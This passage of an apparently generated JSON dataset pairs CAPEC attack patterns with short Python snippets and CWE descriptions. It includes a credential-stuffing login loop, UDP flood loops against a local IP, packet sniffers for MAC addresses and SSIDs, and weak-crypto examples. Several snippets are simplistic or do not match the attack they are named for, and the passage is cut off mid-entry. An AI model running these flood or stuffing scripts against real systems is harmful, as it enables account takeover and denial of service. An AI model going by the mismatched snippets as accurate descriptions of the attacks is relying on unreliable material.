        "description": "This Python code snippet demonstrates several vulnerabilities related to DNS Spoofing and associated CWEs. The `get_hostname` function performs reverse DNS resolution and makes a security decision based on the hostname, which can be exploited if the IP address is spoofed (CWE-350). The `download_code` function downloads and executes code from a remote location without verifying its integrity (CWE-494). The `redirect_to_url` function redirects to a user-provided URL, which can lead to open redirect vulnerabilities (CWE-601). The `fetch_data_from_url` function retrieves data from a URL without validating the destination, making it susceptible to server-side request forgery (CWE-918). These functions collectively illustrate how DNS Spoofing can be exploited to perform various attacks by manipulating DNS responses and leveraging related weaknesses."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import socket\n\n# Simulate a communication channel with improper message integrity enforcement\nserver_address = ('localhost', 10000)\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\ntry:\n    # Send a message to the server\n    message = 'Sensitive data in cleartext'\n    print(f'Sending: {message}')\n    sent = sock.sendto(message.encode(), server_address)\n\n    # Receive a response from the server\n    data, server = sock.recvfrom(4096)\n    print(f'Received: {data.decode()}')\n\nfinally:\n    print('Closing socket')\n    sock.close()",
        "description": "This Python code snippet demonstrates a vulnerable communication channel that embodies the main idea of the CAPEC 'Terrestrial Jamming' attack pattern. The code uses a UDP socket to send a message containing sensitive data in cleartext, which can be easily intercepted and modified by an attacker using a terrestrial jammer. The code does not enforce message integrity (CWE-924), does not ensure communication with the correct endpoint (CWE-923), and transmits sensitive information in cleartext (CWE-319). This makes the communication channel susceptible to jamming and other forms of interference."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import requests\n\n# List of known username/password combinations\ncredentials = [\n    {'username': 'user1', 'password': 'password123'},\n    {'username': 'user2', 'password': 'password123'},\n    {'username': 'user3', 'password': 'password123'},\n]\n\n# Target URL for login\nurl = 'http://example.com/login'\n\n# Attempt to login with each credential\nfor cred in credentials:\n    response = requests.post(url, data=cred)\n    if response.status_code == 200:\n        print(f'Successful login with {cred}')\n    else:\n        print(f'Failed login with {cred}')",
        "description": "This Python code snippet demonstrates a basic credential stuffing attack. It iterates over a list of known username/password combinations and attempts to log in to a target URL using each combination. The code uses the `requests` library to send POST requests to the login endpoint. If the response status code is 200, it indicates a successful login, otherwise, it indicates a failed attempt. This snippet embodies the main idea of CAPEC-credential stuffing by leveraging the fact that many users reuse the same credentials across different systems. The related CWEs are represented by the lack of protection against multiple failed login attempts (CWE-307), the use of single-factor authentication (CWE-308), and the reliance on password systems for primary authentication (CWE-309)."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import socket\nimport threading\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-406: Insufficient Control of Network Message Volume\n# CWE-421: Race Condition During Access to Alternate Channel\n\ndef handle_client(client_socket):\n    while True:\n        try:\n            message = client_socket.recv(1024)\n            if not message:\n                break\n            # CWE-319: Cleartext Transmission of Sensitive Information\n            print(f\"Received: {message.decode('utf-8')}\")\n            # Echo the message back to the client\n            client_socket.send(message)\n        except Exception as e:\n            print(f\"Error: {e}\")\n            break\n    client_socket.close()\n\ndef start_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 9999))\n    server.listen(5)\n    print(\"Server listening on port 9999\")\n\n    while True:\n        client_socket, addr = server.accept()\n        print(f\"Accepted connection from {addr}\")\n        # CWE-421: Race Condition During Access to Alternate Channel\n        client_handler = threading.Thread(target=handle_client, args=(client_socket,))\n        client_handler.start()\n\nif __name__ == \"__main__\":\n    start_server()",
        "description": "This Python code snippet represents a simple TCP server that listens for incoming connections and echoes received messages back to the client. The code embodies the main idea of the CAPEC 'Jamming' by demonstrating vulnerabilities related to communication channels. Specifically, it includes CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not verifying the client's identity, CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting data in cleartext, CWE-924 (Improper Enforcement of Message Integrity During Transmission) by not ensuring message integrity, CWE-406 (Insufficient Control of Network Message Volume) by not limiting the volume of traffic, and CWE-421 (Race Condition During Access to Alternate Channel) by potentially allowing race conditions in handling client connections. This setup can be exploited by an adversary to disrupt communications and deny service to legitimate users."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import hashlib\nimport os\n\n# Use of obsolete function (CWE-477)\ndef generate_md5_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Deprecated reliance on DNS lookups in a security decision (CWE-247)\ndef is_trusted_host(hostname):\n    trusted_hosts = ['trusted.example.com']\n    return hostname in trusted_hosts\n\n# Example usage\nif __name__ == '__main__':\n    data = 'sensitive_data'\n    hostname = 'trusted.example.com'\n\n    # Generate MD5 hash (obsolete function)\n    hash_value = generate_md5_hash(data)\n    print(f'MD5 Hash: {hash_value}')\n\n    # Check if hostname is trusted (deprecated DNS lookup)\n    if is_trusted_host(hostname):\n        print('Host is trusted')\n    else:\n        print('Host is not trusted')",
        "description": "This Python code snippet demonstrates the use of deprecated and obsolete functions, as well as reliance on DNS lookups for security decisions, which are common themes in the provided CAPEC and related CWEs. The `generate_md5_hash` function uses the MD5 hashing algorithm, which is considered obsolete and insecure (CWE-477). The `is_trusted_host` function checks if a hostname is in a list of trusted hosts, relying on DNS lookups for security decisions, which is deprecated (CWE-247). The code highlights the risks associated with using outdated and deprecated methods in security-sensitive contexts."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import threading\n\ndef allocate_resource():\n    global resource_count\n    while True:\n        resource_count += 1\n        if resource_count > MAX_RESOURCES:\n            print('Resource limit exceeded!')\n            break\n\nresource_count = 0\nMAX_RESOURCES = 100\n\nthreads = []\nfor i in range(200):  # Creating more threads than the resource limit\n    t = threading.Thread(target=allocate_resource)\n    threads.append(t)\n    t.start()\n\nfor t in threads:\n    t.join()",
        "description": "This Python code snippet demonstrates a scenario where an adversary can block the delivery of an important system resource by causing uncontrolled resource consumption. The code creates multiple threads that continuously allocate resources without any limits or throttling (CWE-770). As the resource count exceeds the maximum allowed resources, it prints a message indicating that the resource limit has been exceeded. This represents a failure to use proper protection mechanisms (CWE-693) and can lead to system failure or stoppage, embodying the main idea of the CAPEC 'Blockage'."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import socket\nimport threading\n\n# Function to flood the Wi-Fi access point with deauthentication frames\n# This is a simplified representation and does not perform actual deauthentication\n\ndef flood_deauth_frames(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = b'DEAUTH'\n    while True:\n        sock.sendto(message, (target_ip, target_port))\n\n# Function to simulate high levels of noise on the RF band\n# This is a simplified representation and does not perform actual RF jamming\n\ndef transmit_noise(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    noise = b'NOISE' * 1024\n    while True:\n        sock.sendto(noise, (target_ip, target_port))\n\n# Start threads to perform both attacks\n\ntarget_ip = '192.168.1.1'\ntarget_port = 80\n\nthread1 = threading.Thread(target=flood_deauth_frames, args=(target_ip, target_port))\nthread2 = threading.Thread(target=transmit_noise, args=(target_ip, target_port))\n\nthread1.start()\nthread2.start()\n\nthread1.join()\nthread2.join()",
        "description": "This Python code snippet demonstrates a simplified version of a Wi-Fi jamming attack. It includes two main functions: `flood_deauth_frames` and `transmit_noise`. The `flood_deauth_frames` function simulates flooding a Wi-Fi access point with deauthentication frames, while the `transmit_noise` function simulates transmitting high levels of noise on the RF band. Both functions use UDP sockets to send continuous messages to the target IP and port, representing the disruption of communication. This code embodies the main idea of the CAPEC by illustrating how an attacker might prevent users from transmitting or receiving data on a Wi-Fi network. The related CWEs provide context on potential weaknesses, such as improper enforcement of message integrity and cleartext transmission of sensitive information, which can be exploited in such attacks."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import socket\n\n# Simulate a cellular jamming attack by sending noise to a communication channel\n\ndef send_noise(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    noise = b'\\x00' * 1024  # 1KB of noise data\n    try:\n        while True:\n            sock.sendto(noise, (target_ip, target_port))\n    except KeyboardInterrupt:\n        print('Jamming stopped')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'  # IP address of the target cell tower\n    target_port = 12345  # Port used for communication\n    send_noise(target_ip, target_port)",
        "description": "This Python code snippet simulates a cellular jamming attack by continuously sending noise data to a specified target IP and port, representing a cell tower's communication channel. The `send_noise` function creates a UDP socket and sends 1KB of noise data in an infinite loop to overwhelm the target. This embodies the main idea of the CAPEC by disrupting communication between a cellular user device and a cell tower. The code also touches on related CWEs: it does not verify the identity of the sender (CWE-300), does not ensure message integrity (CWE-924), and transmits data that can be intercepted (CWE-319)."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import random\n\nclass CellularConnection:\n    def __init__(self):\n        self.encryption_modes = ['A5/0', 'A5/1', 'A5/2', 'A5/3']\n        self.selected_mode = None\n\n    def negotiate_encryption(self):\n        # Simulate an attacker forcing a downgrade to a weaker encryption mode\n        self.selected_mode = random.choice(['A5/0', 'A5/1', 'A5/2'])\n        print(f\"Encryption mode selected: {self.selected_mode}\")\n\n    def transmit_data(self, data):\n        if self.selected_mode == 'A5/0':\n            print(\"Transmitting data without encryption.\")\n        elif self.selected_mode in ['A5/1', 'A5/2']:\n            print(f\"Transmitting data with weak encryption: {self.selected_mode}.\")\n        else:\n            print(\"Transmitting data with strong encryption.\")\n\n# Example usage\nconnection = CellularConnection()\nconnection.negotiate_encryption()\nconnection.transmit_data(\"Sensitive Information\")",
        "description": "This Python code snippet simulates a cellular connection where an attacker can force the mobile device to use a weaker encryption mode. The `CellularConnection` class has a method `negotiate_encryption` that randomly selects an encryption mode, simulating an attacker's influence to downgrade the encryption to a weaker mode (A5/0, A5/1, or A5/2). The `transmit_data` method then transmits data based on the selected encryption mode, highlighting the vulnerability of transmitting data without strong encryption. This code embodies the main idea of CAPEC-Weakening of Cellular Encryption and incorporates related CWEs such as algorithm downgrade, inadequate encryption strength, and the use of broken or risky cryptographic algorithms."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import threading\n\nclass SharedResource:\n    def __init__(self):\n        self.resource = 0\n        self.lock = threading.Lock()\n\n    def increment(self):\n        with self.lock:\n            self.resource += 1\n            print(f'Resource incremented to {self.resource}')\n\n    def decrement(self):\n        with self.lock:\n            self.resource -= 1\n            print(f'Resource decremented to {self.resource}')\n\n# Simulate obstruction by not using the lock\nclass ObstructedResource(SharedResource):\n    def increment(self):\n        self.resource += 1\n        print(f'(Obstructed) Resource incremented to {self.resource}')\n\n    def decrement(self):\n        self.resource -= 1\n        print(f'(Obstructed) Resource decremented to {self.resource}')\n\n# Create instances\nsafe_resource = SharedResource()\nunsafe_resource = ObstructedResource()\n\n# Simulate concurrent access\nthreads = []\nfor _ in range(5):\n    t1 = threading.Thread(target=safe_resource.increment)\n    t2 = threading.Thread(target=unsafe_resource.increment)\n    threads.extend([t1, t2])\n\nfor t in threads:\n    t.start()\n\nfor t in threads:\n    t.join()",
        "description": "This Python code snippet demonstrates the concept of 'Obstruction' by simulating a shared resource that can be accessed by multiple threads. The 'SharedResource' class uses a lock to ensure safe concurrent access, preventing race conditions (CWE-1298). The 'ObstructedResource' class, however, does not use the lock, representing a failure in the protection mechanism (CWE-693) and improper isolation (CWE-653). This can lead to race conditions and inconsistent states, embodying the idea of an attacker obstructing interactions between system components, causing the system to degrade or malfunction."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import os\nfrom Crypto.Cipher import DES\n\n# CWE-321: Use of Hard-coded Cryptographic Key\nhardcoded_key = b'8bytekey'\n\n# CWE-326: Inadequate Encryption Strength\n# DES is considered weak and not recommended for secure applications\ncipher = DES.new(hardcoded_key, DES.MODE_ECB)\n\n# Encrypting a sample message\nplaintext = b'SecretMsg'\nciphertext = cipher.encrypt(plaintext.ljust(8))\n\nprint(f'Ciphertext: {ciphertext.hex()}')\n\n# Decrypting the message\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# DES is susceptible to cryptanalysis attacks\ndecrypted_text = cipher.decrypt(ciphertext).strip()\n\nprint(f'Decrypted Text: {decrypted_text.decode()}')",
        "description": "This Python code snippet demonstrates the use of a broken or risky cryptographic algorithm (DES) with a hard-coded cryptographic key, embodying the main idea of the CAPEC 'Cryptanalysis of Cellular Encryption'. The code uses DES, which is known to be weak and susceptible to cryptanalysis attacks, to encrypt and decrypt a sample message. The hard-coded key and the use of DES highlight vulnerabilities such as inadequate encryption strength and the use of a broken cryptographic algorithm. This example represents how weak encryption can be exploited, similar to how older cellular encryption algorithms like A5/1 and A5/2 can be attacked."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import socket\n\n# Establish a connection to a server\nserver_address = ('example.com', 80)\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(server_address)\n\n# Send sensitive data in cleartext\nsensitive_data = 'username=admin&password=admin123'\nsock.sendall(sensitive_data.encode('utf-8'))\n\n# Receive response\nresponse = sock.recv(4096)\nprint('Received:', response.decode('utf-8'))\n\nsock.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a client-server communication where sensitive data is transmitted in cleartext. The code establishes a connection to a server using a socket and sends sensitive information (username and password) without any encryption. This embodies the main idea of the CAPEC 'Cellular Traffic Intercept' by showing how sensitive data can be intercepted if not properly protected. The related CWEs are represented as follows:\n- CWE-311 (Missing Encryption of Sensitive Data): The sensitive data is not encrypted before transmission.\n- CWE-319 (Cleartext Transmission of Sensitive Information): The data is sent in cleartext, making it susceptible to interception.\n- CWE-940 (Improper Verification of Source of a Communication Channel): The code does not verify the authenticity of the server.\n- CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel): There is no mechanism to ensure the integrity of the data during transmission."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-406: Insufficient Control of Network Message Volume\n\n# Simulate a vulnerable communication channel\nserver_address = ('localhost', 10000)\n\n# Create a TCP/IP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect the socket to the port where the server is listening\nsock.connect(server_address)\n\ntry:\n    # CWE-201: Inserting sensitive information into sent data\n    message = 'SensitiveData:12345;NormalData:Hello'\n    print(f'Sending: {message}')\n    sock.sendall(message.encode('utf-8'))\n\n    # CWE-319: Transmitting sensitive information in cleartext\n    # CWE-924: No integrity check on the message\n    data = sock.recv(1024)\n    print(f'Received: {data.decode('utf-8')}')\n\n    # CWE-406: No control over the volume of messages sent\n    for _ in range(1000):\n        sock.sendall(b'Ping')\nfinally:\n    print('Closing socket')\n    sock.close()",
        "description": "This Python code snippet demonstrates a vulnerable communication channel that embodies the main idea of the CAPEC 'Cellular Data Injection'. The code creates a TCP/IP socket connection to a server and sends a message containing sensitive information in cleartext (CWE-319). The message includes sensitive data that should not be transmitted (CWE-201) and lacks integrity checks (CWE-924). Additionally, the code sends a large volume of 'Ping' messages without control, illustrating network amplification (CWE-406). This setup can be exploited by adversaries to inject data, disrupt communications, or conduct surveillance."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import requests\n\n# Vulnerable URL redirection\ntrusted_domain = 'http://trusted.com/login'\nuser_input = 'http://trvsted.com/login'  # BitSquatted domain\n\n# Simulate a URL redirection vulnerability\nredirect_url = user_input if 'trusted.com' in user_input else trusted_domain\n\n# Simulate a GET request with sensitive data\nsensitive_data = {'username': 'admin', 'password': 'password123'}\nresponse = requests.get(redirect_url, params=sensitive_data)\n\nprint(f'Redirected to: {response.url}')\nprint(f'Status Code: {response.status_code}')",
        "description": "This Python code snippet demonstrates a BitSquatting attack combined with several related CWEs. The code simulates a URL redirection vulnerability (CWE-601) where user input is used to determine the redirection URL. If the user input contains a BitSquatted domain (one bit different from the trusted domain), the redirection occurs to the malicious domain. Additionally, the code uses the HTTP GET method to send sensitive information (CWE-598), which is insecure. This example highlights how an attacker can exploit BitSquatting to redirect traffic to a malicious site and potentially capture sensitive data."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to capture WiFi packets and extract MAC addresses\ndef capture_mac_addresses(interface):\n    # Create a raw socket to listen for WiFi packets\n    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    sock.bind((interface, 0))\n\n    mac_addresses = set()\n\n    while True:\n        # Receive a packet\n        packet = sock.recvfrom(2048)[0]\n\n        # Extract the MAC address from the packet\n        mac_address = packet[6:12]\n        mac_address = ':'.join('%02x' % b for b in mac_address)\n\n        # Log the MAC address\n        if mac_address not in mac_addresses:\n            mac_addresses.add(mac_address)\n            print(f\"Captured MAC Address: {mac_address}\")\n\n        time.sleep(1)\n\n# Example usage\nif __name__ == \"__main__\":\n    capture_mac_addresses('wlan0')",
        "description": "This Python code snippet demonstrates a basic implementation of WiFi MAC address tracking. The code creates a raw socket to listen for WiFi packets on a specified network interface (e.g., 'wlan0'). It captures packets, extracts the MAC addresses, and logs them. This embodies the main idea of the CAPEC 'WiFi MAC Address Tracking' by passively listening for WiFi messages and logging the associated MAC addresses. The code also touches on related CWEs, such as CWE-201 (Insertion of Sensitive Information Into Sent Data) by capturing and logging sensitive MAC addresses, and CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the identity of actors on the communication channel."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import socket\nimport struct\n\n# Function to passively listen for WiFi management frames\ndef listen_for_ssid(interface):\n    # Create a raw socket to capture packets\n    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    sock.bind((interface, 0x0003))\n\n    while True:\n        packet = sock.recvfrom(2048)[0]\n        # Check if the packet is a management frame (type 0)\n        if packet[26] == 0:\n            # Extract the SSID from the packet\n            ssid_length = packet[37]\n            ssid = packet[38:38 + ssid_length].decode('utf-8', errors='ignore')\n            print(f'Captured SSID: {ssid}')\n\n# Example usage\nlisten_for_ssid('wlan0')",
        "description": "This Python code snippet demonstrates a passive WiFi SSID tracking mechanism. It creates a raw socket to capture packets on a specified network interface (e.g., 'wlan0'). The code listens for WiFi management frames and extracts the SSID from these frames. This represents the main idea of the CAPEC 'WiFi SSID Tracking' by showing how an attacker can passively listen for SSIDs to track users. The code also embodies CWE-201 by transmitting sensitive SSID information, CWE-300 by not verifying the identity of actors, and CWE-1290 by potentially allowing unauthorized access to the SSID data."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import pyDes\n\n# Simulate a weak DES key (CWE-327, CWE-326)\nweak_des_key = pyDes.des(b'12345678', pyDes.ECB, pad=None, padmode=pyDes.PAD_PKCS5)\n\n# Simulate an OTA update message\nota_message = b'Update SIM firmware'\n\n# Encrypt the OTA message with the weak DES key\nencrypted_message = weak_des_key.encrypt(ota_message)\n\n# Simulate sending the encrypted message to the SIM card\n# In a real scenario, this would be sent via SMS\nprint(f'Encrypted OTA message: {encrypted_message}')\n\n# Simulate the SIM card decrypting the message\n# An attacker who cracks the DES key can decrypt the message\ndecrypted_message = weak_des_key.decrypt(encrypted_message)\nprint(f'Decrypted OTA message: {decrypted_message}')",
        "description": "This Python code snippet demonstrates the concept of 'Rooting SIM Cards' by simulating the use of a weak DES key (CWE-327, CWE-326) to encrypt and decrypt an OTA update message. The weak DES key represents the use of a broken or risky cryptographic algorithm, which can be cracked by an attacker. Once the DES key is cracked, the attacker can send properly signed binary SMS messages to the device, which are treated as executable code on the SIM card. This code highlights the vulnerability of using inadequate encryption strength and the potential for abuse if an attacker gains control over the SIM card's functionalities."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import socket\n\n# Simulate a client connecting to a Wi-Fi access point\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to a potentially malicious Wi-Fi access point (Evil Twin)\nclient_socket.connect(('192.168.1.1', 8080))\n\n# Send sensitive information in cleartext (CWE-319)\nsensitive_data = 'username=admin&password=admin123'\nclient_socket.sendall(sensitive_data.encode('utf-8'))\n\n# Receive data without verifying the source (CWE-940)\nresponse = client_socket.recv(1024)\nprint('Received:', response.decode('utf-8'))\n\nclient_socket.close()",
        "description": "This Python code snippet demonstrates a client connecting to a potentially malicious Wi-Fi access point (Evil Twin). The client sends sensitive information in cleartext (CWE-319) and receives data without verifying the source (CWE-940). This embodies the main idea of the Evil Twin Wi-Fi Attack (CAPEC-94), where an adversary sets up a rogue access point to intercept and manipulate Wi-Fi data traffic. The code highlights vulnerabilities such as cleartext transmission of sensitive information and improper verification of the communication channel's source."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Simulate a legitimate resource path\nlegitimate_path = '/usr/local/bin/resource'\n\n# Simulate a rogue resource path\nrogue_path = '/tmp/resource'\n\n# Function to access a resource\ndef access_resource(path):\n    if os.path.exists(path):\n        with open(path, 'r') as file:\n            data = file.read()\n            print(f'Accessed data: {data}')\n    else:\n        print('Resource not found')\n\n# Simulate accessing the resource\n# Vulnerable to CWE-426: Untrusted Search Path\nresource_path = input('Enter the resource path: ')\naccess_resource(resource_path)\n",
        "description": "This Python code snippet demonstrates a scenario where an adversary can establish a rogue location to trick a victim into accessing a malicious resource. The code simulates a legitimate resource path and a rogue resource path. The `access_resource` function attempts to access and read the content of a file at a given path. The user is prompted to input the resource path, which is then used without proper verification (CWE-940). If the user inputs the rogue path, the malicious resource is accessed, potentially exposing sensitive information (CWE-200). This example highlights the vulnerability of using an untrusted search path (CWE-426) and the risks associated with improper verification of the source of a communication channel."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import socket\n\nclass RogueBaseStation:\n    def __init__(self, host='0.0.0.0', port=12345):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n\n    def start(self):\n        print(f'Rogue Base Station running on {self.host}:{self.port}')\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            print(f'Connection from {addr}')\n            self.handle_client(client_socket)\n\n    def handle_client(self, client_socket):\n        try:\n            data = client_socket.recv(1024)\n            if data:\n                print(f'Received data: {data}')\n                # Simulate improper verification and message integrity\n                client_socket.sendall(b'Rogue Base Station Response')\n        finally:\n            client_socket.close()\n\nif __name__ == '__main__':\n    rogue_base_station = RogueBaseStation()\n    rogue_base_station.start()",
        "description": "This Python code snippet represents a simplified version of a 'Cellular Rogue Base Station' attack. The `RogueBaseStation` class sets up a server socket that listens for incoming connections, mimicking a legitimate cellular base station. When a device connects, the rogue base station accepts the connection and handles the client by receiving data and sending a response. The code demonstrates several vulnerabilities: it does not verify the source of the communication (CWE-940), does not ensure the integrity of the communication channel (CWE-300, CWE-924), and does not restrict the communication channel to intended endpoints (CWE-923). This setup allows an attacker to intercept and potentially manipulate communications from devices that connect to it."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import requests\n\n# Vulnerable function to send a broadcast message\n\ndef send_broadcast_message(phone_number, message):\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    data = {\n        'phone_number': phone_number,\n        'message': message\n    }\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    response = requests.post('http://example.com/send_broadcast', json=data)\n    return response.status_code\n\n# Attacker uses the function to send a broadcast message\n# CWE-300: Channel Accessible by Non-Endpoint\nattacker_phone_number = '1234567890'\nmessage = 'Test broadcast message'\nstatus = send_broadcast_message(attacker_phone_number, message)\nprint(f'Broadcast message sent with status code: {status}')",
        "description": "This Python code snippet demonstrates a vulnerable function `send_broadcast_message` that sends a broadcast message to a specified phone number. The function takes a phone number and a message as input and sends this data to a server endpoint using an HTTP POST request. The code embodies the main idea of the CAPEC by showing how an attacker could exploit the system to send broadcast messages to a target's mobile device. The vulnerabilities highlighted by the related CWEs are also represented: \n- CWE-201: Sensitive information (phone number) is included in the transmitted data.\n- CWE-940: The source of the communication channel is not properly verified.\n- CWE-300: The communication channel can be accessed by an unauthorized actor (attacker)."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Simulate a device broadcasting its WiFi MAC address\nMAC_ADDRESS = '00:0a:95:9d:68:16'\n\n# Function to simulate sending a broadcast message\ndef send_broadcast_message(mac_address):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n    message = f'Device MAC: {mac_address}'\n    sock.sendto(message.encode(), ('<broadcast>', 37020))\n    sock.close()\n\n# Function to simulate receiving a broadcast message\ndef receive_broadcast_message():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind(('', 37020))\n    while True:\n        data, addr = sock.recvfrom(1024)\n        print(f'Received message: {data.decode()} from {addr}')\n\n# Simulate the device broadcasting its MAC address periodically\nwhile True:\n    send_broadcast_message(MAC_ADDRESS)\n    time.sleep(5)",
        "description": "This Python code snippet simulates a device broadcasting its WiFi MAC address periodically. The `send_broadcast_message` function sends a broadcast message containing the device's MAC address, while the `receive_broadcast_message` function listens for incoming broadcast messages. This setup embodies the main idea of the CAPEC 'Signal Strength Tracking' by demonstrating how an attacker could passively monitor the signal strength of the target's WiFi RF signal to identify the source location. The code also highlights related CWEs, such as CWE-201 (Insertion of Sensitive Information Into Sent Data) by broadcasting the MAC address, and CWE-1300 (Improper Protection of Physical Side Channels) by not protecting the broadcasted information."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import ssl\nimport socket\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but allow weak ciphers\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS)\ncontext.set_ciphers('DES-CBC3-SHA')  # Weak cipher\n\n# Connect to a server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send sensitive data\nwrapped_socket.send(b'Sensitive Data')\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker forces the encryption level to be lowered, making the encrypted data vulnerable. The code creates an SSL context that allows the use of a weak cipher (DES-CBC3-SHA), which is an example of CWE-757 (Algorithm Downgrade). The code then establishes a connection to a server and sends sensitive data over this weakly encrypted channel. This embodies the main idea of the CAPEC 'Drop Encryption Level' by showing how an attacker could exploit the use of a less secure algorithm during negotiation, making the data susceptible to attacks. Additionally, it touches on CWE-326 (Inadequate Encryption Strength) by using a weak cipher for encryption."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import socket\nimport time\n\n# Simulate sending sensitive data over a network\nsensitive_data = 'user_password=12345'\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to a server (example IP and port)\nsock.connect(('192.168.1.1', 8080))\n\n# Send sensitive data in cleartext\nsock.sendall(sensitive_data.encode('utf-8'))\n\n# Simulate packet timing by sending data in intervals\nfor i in range(5):\n    message = f'Packet {i}'\n    sock.sendall(message.encode('utf-8'))\n    time.sleep(0.5)  # Introduce a delay to simulate timing\n\nsock.close()",
        "description": "This Python code snippet demonstrates the concept of 'Analysis of Packet Timing and Sizes' by simulating the transmission of sensitive data over a network. The code creates a socket connection to a server and sends sensitive information in cleartext, which is vulnerable to interception (CWE-319). Additionally, it sends packets at regular intervals, introducing observable timing discrepancies (CWE-208) that an attacker could analyze to infer information about the communication. The timing and size of the packets can reveal metadata, even if the actual data is encrypted, aligning with the CAPEC description."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import os\nimport time\nimport random\nimport hashlib\n\n# Simulate cryptographic processing\nclass CryptoDevice:\n    def __init__(self, key):\n        self.key = key\n\n    def process_data(self, data):\n        # Simulate a delay to represent processing time\n        time.sleep(random.uniform(0.01, 0.1))\n        # Simulate cryptographic processing\n        return hashlib.sha256((self.key + data).encode()).hexdigest()\n\n# Simulate an attacker passively monitoring electromagnetic emissions\nclass ElectromagneticSideChannelAttack:\n    def __init__(self, device):\n        self.device = device\n\n    def monitor_emissions(self, data):\n        # Simulate capturing emissions (in reality, this would be more complex)\n        emissions = []\n        for _ in range(100):\n            start_time = time.time()\n            self.device.process_data(data)\n            end_time = time.time()\n            emissions.append(end_time - start_time)\n        return emissions\n\n# Example usage\nkey = \"supersecretkey\"\ndevice = CryptoDevice(key)\nattacker = ElectromagneticSideChannelAttack(device)\n\n# Attacker monitors emissions while device processes data\nemissions = attacker.monitor_emissions(\"sensitive_data\")\n\n# In a real attack, the attacker would analyze the emissions to derive the 